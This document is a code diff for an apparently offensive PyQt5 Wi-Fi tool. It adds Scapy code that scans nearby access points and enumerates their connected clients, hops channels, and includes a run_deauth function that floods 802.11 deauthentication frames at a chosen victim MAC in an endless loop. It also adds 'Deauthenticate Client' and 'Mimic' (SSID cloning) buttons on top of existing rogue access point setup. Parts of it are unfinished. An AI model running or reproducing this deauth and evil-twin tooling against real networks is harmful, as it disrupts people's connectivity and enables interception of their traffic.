@@ -6,6 +6,7 @@
 #
 # WARNING! All changes made in this file will be lost!
 import time
+from collections import namedtuple, Set
 
 from PyQt5 import QtCore, QtGui, QtWidgets
 
@@ -13,9 +14,19 @@ from PyQt5 import QtCore, QtGui, QtWidgets
 import subprocess
 from subprocess import PIPE
 
+from PyQt5.QtCore import Qt
+from PyQt5.QtWidgets import QMenu, QMainWindow, QTableWidgetItem
+from scapy.all import *
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt
+from scapy.layers.eap import EAPOL
+from threading import Thread
+import time
+import os
 
-class Ui_MainWindow(object):
+
+class Ui_MainWindow(QMainWindow):
     def __init__(self):
+        super().__init__()
         self.is_sniffing = False
         self.has_ap = False
         self.mon_adapter = ""
@@ -24,6 +35,11 @@ class Ui_MainWindow(object):
         self.ap_label = QtWidgets.QLabel("")
         self.adapters = self.get_ip_adapters()
         self.ssid = "hackerman1233"
+        self.setupUi(self)
+
+        self.networks = {}
+        self.clients = {}
+        self.Network = namedtuple("Network", "BSSID SSID Signal_dBm Channel Crypto Clients")
 
     def setupUi(self, MainWindow):
         MainWindow.setObjectName("MainWindow")
@@ -68,15 +84,38 @@ class Ui_MainWindow(object):
         self.label_6 = QtWidgets.QLabel(self.layoutWidget_2)
         self.label_6.setObjectName("label_6")
         self.verticalLayout_6.addWidget(self.label_6)
+
         self.packet_list = QtWidgets.QListWidget(self.layoutWidget_2)
         self.packet_list.setObjectName("listWidget_6")
+
         self.packet_list.addItem("test")
+
         self.verticalLayout_6.addWidget(self.packet_list)
+
+        # buttons in packet_list
+        self.horizontalLayout_2 = QtWidgets.QHBoxLayout()
+        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
+        self.pushButton = QtWidgets.QPushButton(self.layoutWidget_2)
+        self.pushButton.setObjectName("pushButton")
+        self.horizontalLayout_2.addWidget(self.pushButton)
+        self.pushButton_2 = QtWidgets.QPushButton(self.layoutWidget_2)
+        self.pushButton_2.setObjectName("pushButton_2")
+        self.horizontalLayout_2.addWidget(self.pushButton_2)
+        self.verticalLayout_6.addLayout(self.horizontalLayout_2)
+
         self.layoutWidget_3 = QtWidgets.QWidget(self.splitter_2)
         self.layoutWidget_3.setObjectName("layoutWidget_3")
         self.verticalLayout_7 = QtWidgets.QVBoxLayout(self.layoutWidget_3)
         self.verticalLayout_7.setContentsMargins(0, 0, 0, 0)
         self.verticalLayout_7.setObjectName("verticalLayout_7")
+
+        # set line
+        self.line = QtWidgets.QFrame(self.layoutWidget_3)
+        self.line.setFrameShape(QtWidgets.QFrame.HLine)
+        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
+        self.line.setObjectName("line")
+        self.verticalLayout_7.addWidget(self.line)
+
         self.label_7 = QtWidgets.QLabel(self.layoutWidget_3)
         self.label_7.setObjectName("label_7")
         self.verticalLayout_7.addWidget(self.label_7)
@@ -91,17 +130,41 @@ class Ui_MainWindow(object):
         self.verticalLayout = QtWidgets.QVBoxLayout(self.layoutWidget)
         self.verticalLayout.setContentsMargins(0, 0, 0, 0)
         self.verticalLayout.setObjectName("verticalLayout")
+
         self.label = QtWidgets.QLabel(self.layoutWidget)
         self.label.setObjectName("label")
         self.verticalLayout.addWidget(self.label)
-        self.listWidget = QtWidgets.QListWidget(self.layoutWidget)
-        self.listWidget.setObjectName("listWidget")
-        self.verticalLayout.addWidget(self.listWidget)
+
+        self.mimic_table = QtWidgets.QTableWidget(self.layoutWidget)
+        self.mimic_table.setObjectName("mimic_table")
+        self.verticalLayout.addWidget(self.mimic_table)
+        self.mimic_table.clicked.connect(self.test)
+
+        # mimic list buttons
+        self.horizontalLayout_3 = QtWidgets.QHBoxLayout()
+        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
+        self.pushButton_3 = QtWidgets.QPushButton(self.layoutWidget)
+        self.pushButton_3.setObjectName("pushButton_3")
+        self.horizontalLayout_3.addWidget(self.pushButton_3)
+        self.pushButton_4 = QtWidgets.QPushButton(self.layoutWidget)
+        self.pushButton_4.setObjectName("pushButton_4")
+        self.pushButton_4.clicked.connect(self.refresh_mimic_table)
+        self.horizontalLayout_3.addWidget(self.pushButton_4)
+        self.verticalLayout.addLayout(self.horizontalLayout_3)
+
         self.layoutWidget1 = QtWidgets.QWidget(self.splitter)
         self.layoutWidget1.setObjectName("layoutWidget1")
         self.verticalLayout_5 = QtWidgets.QVBoxLayout(self.layoutWidget1)
         self.verticalLayout_5.setContentsMargins(0, 0, 0, 0)
         self.verticalLayout_5.setObjectName("verticalLayout_5")
+
+        # set line
+        self.line_2 = QtWidgets.QFrame(self.layoutWidget1)
+        self.line_2.setFrameShape(QtWidgets.QFrame.HLine)
+        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
+        self.line_2.setObjectName("line_2")
+        self.verticalLayout_5.addWidget(self.line_2)
+
         self.label_5 = QtWidgets.QLabel(self.layoutWidget1)
         self.label_5.setObjectName("label_5")
         self.verticalLayout_5.addWidget(self.label_5)
@@ -153,8 +216,12 @@ class Ui_MainWindow(object):
         __sortingEnabled = self.packet_list.isSortingEnabled()
         self.packet_list.setSortingEnabled(False)
         self.packet_list.setSortingEnabled(__sortingEnabled)
+        self.pushButton.setText(_translate("MainWindow", "Deauthenticate Client"))
+        self.pushButton_2.setText(_translate("MainWindow", "PushButton"))
         self.label_7.setText(_translate("MainWindow", "AP\'s in vicinity"))
         self.label.setText(_translate("MainWindow", "SSID\'s to mimic"))
+        self.pushButton_3.setText(_translate("MainWindow", "Mimic"))
+        self.pushButton_4.setText(_translate("MainWindow", "Refresh"))
         self.label_5.setText(_translate("MainWindow", "Clients connected to mimicked AP"))
         self.menuOptions.setTitle(_translate("MainWindow", "Options"))
 
@@ -171,6 +238,7 @@ class Ui_MainWindow(object):
         self.mon_action.setShortcut(_translate("MainWindow", "Ctrl+D"))
         self.actionSet_Output_File.setText(_translate("MainWindow", "Set Output Path"))
         self.actionSet_Output_File.setShortcut(_translate("MainWindow", "Ctrl+O"))
+        self.show()
 
     def start_sniffing(self):
         self.mon_adapter = self.mon_box.currentText()
@@ -184,6 +252,9 @@ class Ui_MainWindow(object):
         self.mon_action.triggered.connect(self.stop_sniffing)
 
         self.retranslateUi(MainWindow)
+
+        time.sleep(0.5)
+        self.start_ap_search()
 
     def stop_sniffing(self):
         self.disable_monitoring(self.mon_adapter)
@@ -269,7 +340,8 @@ class Ui_MainWindow(object):
                        "server=8.8.8.8\n"
                        "log-queries\n"
                        "log-dhcp\n"
-                       "listen-address=127.0.0.1".format(self.ap_adapter + "mon"))
+                       "listen-address=127.0.0.1"
+                       "port=1046".format(self.ap_adapter + "mon"))
 
         process = subprocess.Popen(['sudo', 'ifconfig', self.ap_adapter + "mon", "up", "192.168.1.1", "netmask",
                                     "255.255.255.0"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -294,6 +366,118 @@ class Ui_MainWindow(object):
     def stop_ap(self):
         print("NOT IMPLEMENTED YET")
 
+    def run_deauth(self, victimMAC, APMAC):
+        pkt = RadioTap() / Dot11(addr1=victimMAC, addr2=APMAC,
+                                 addr3=APMAC) / Dot11Deauth()  # RadioTap() is first layer wireless packer, Dot11() Management layer Dot11Deauth() creates deauth frame.
+        # pkt1 = RadioTap() / Dot11(addr1=APMAC, addr2=victimMAC, addr3=victimMAC) / Dot11Deauth()
+        while (True):
+            sendp(pkt, iface="wlp3s0mon")
+
+    def sniff_helper(self):
+        adapter = "wlp3s0mon"
+        sniff(prn=self.pkt_received, iface=adapter)
+
+    def start_ap_search(self):
+        # start sniffing
+        sniffer = Thread(target=self.sniff_helper)
+        sniffer.daemon = True
+        sniffer.start()
+        time.sleep(0.5)
+
+        # start the channel changer
+        channel_changer = Thread(target=self.change_channel)
+        channel_changer.daemon = True
+        channel_changer.start()
+
+    def pkt_received(self, pkt):
+        # frame with type 0 (management frame) and subtype 8 (beacon frame)
+        if pkt.getlayer(Dot11).type == 0 and pkt.getlayer(Dot11).subtype == 8:
+
+            # get the bssid (mac address) of the access point
+            bssid = pkt[Dot11].addr2
+
+            # get the SSID of the access point
+            ssid = pkt[Dot11Elt].info.decode()
+
+            # attempt to retrieve the signal strength for the AP
+            try:
+                dbm_signal = pkt.dBm_AntSignal
+            except:
+                dbm_signal = "N/A"
+
+            try:
+                # extract network stats
+                stats = pkt[Dot11Beacon].network_stats()
+                # get the channel of the AP
+                channel = stats.get("channel")
+                # get the crypto
+                crypto = stats.get("crypto")
+            except:
+                channel = "N/A"
+                crypto = "N/A"
+
+            # if the access point has a client list declared
+            if bssid in self.clients:
+                self.networks[bssid] = (self.Network(bssid, ssid, dbm_signal, channel, crypto, self.clients[bssid]))
+            else:
+                self.networks[bssid] = (self.Network(bssid, ssid, dbm_signal, channel, crypto, set()))
+
+        # frame with type 2 (data frame) that is not an EAPOL frame: this way we make sure the AP and client actually
+        # have an ongoing connection
+        elif pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
+            src = pkt.getlayer(Dot11).addr2
+            dest = pkt.getlayer(Dot11).addr1
+
+            # if the source mac address is known as an AP to us
+            if src in self.networks:
+                # initialize the client list if the key was not known
+                if src not in self.clients:
+                    self.clients[src] = set()
+                # ignore broadcast channel
+                if dest != "ff:ff:ff:ff:ff:ff":
+                    self.clients[src].add(dest)
+
+            # if the destination mac address is known as an AP to us
+            if dest in self.networks:
+                # initialize the client list if the key was not known
+                if dest not in self.clients:
+                    self.clients[dest] = set()
+                # ignore broadcast channel
+                if src != "ff:ff:ff:ff:ff:ff":
+                    self.clients[dest].add(src)
+
+    def refresh_mimic_table(self):
+        self.mimic_table.clear()
+
+        self.mimic_table.setColumnCount(5)
+        self.mimic_table.setRowCount(len(self.networks))
+
+        horHeaders = ["BSSID", "SSID", "Signal (dBm)", "Channel", "Crypto"]
+
+        for m, key in enumerate(self.networks.keys()):
+            for n, item in enumerate(self.networks[key]):
+                newitem = QTableWidgetItem(str(item))
+                self.mimic_table.setItem(m, n, newitem)
+
+        self.mimic_table.setHorizontalHeaderLabels(horHeaders)
+
+        self.mimic_table.resizeColumnsToContents()
+        self.mimic_table.resizeRowsToContents()
+
+    def change_channel(self):
+        ch = 1
+        adapter = "wlp3s0mon"
+        while True:
+            os.system(f"sudo iwconfig {adapter} channel {ch}")
+            # switch channel from 1 to 14 each 0.5s
+            ch = ch % 14 + 1
+            time.sleep(0.5)
+
+    def test(self):
+        row = self.mimic_table.currentIndex().row()
+        column = self.mimic_table.currentIndex().column()
+        item = self.mimic_table.item(row, column)
+
 
 if __name__ == "__main__":
     import sys
@@ -301,6 +485,4 @@ if __name__ == "__main__":
     app = QtWidgets.QApplication(sys.argv)
     MainWindow = QtWidgets.QMainWindow()
     ui = Ui_MainWindow()
-    ui.setupUi(MainWindow)
-    MainWindow.show()
     sys.exit(app.exec_())
